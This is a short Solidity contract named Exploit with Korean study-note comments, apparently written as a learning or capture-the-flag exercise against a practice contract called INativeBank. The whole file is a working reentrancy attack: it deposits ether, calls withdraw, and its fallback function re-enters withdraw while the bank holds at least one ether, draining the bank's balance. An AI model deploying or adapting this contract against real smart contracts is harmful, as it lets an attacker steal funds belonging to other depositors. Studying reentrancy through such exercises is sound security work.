// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface INativeBank {
    function withdraw() external;
}

contract Exploit {
    INativeBank nb;

    constructor(INativeBank _nb) {
        // interface 자료형, 업케스팅? 잘 기억안남 여튼 nb를 받기위함
        nb = _nb;
    }

    fallback() external payable {
        // 근데 그냥 fallback대신 receive로 해도 잘 되는거 같은데 무슨 차이지? calldata의 차이라고한다.
        //트렌젝션에서 externalfunction을 호출할때, 매개변수를 저장하는 읽기전용 메모리 공간이라고 한다.
        // 역시 nativetocken을 주고 받으려면 payable이 있어야함 + receive가 없어서 에러가 나는데, 걍 무시
        // 외부호출, reenterancy
        if (address(nb).balance >= 1 * 10 ** 18) {
            nb.withdraw();
        }
    }

    function exploit() external payable {
        //navtivetoken을 주고받을 수 음음
        (bool success, ) = address(nb).call{value: msg.value}("");
        require(success, "failed to staking");
        nb.withdraw();
    }
}
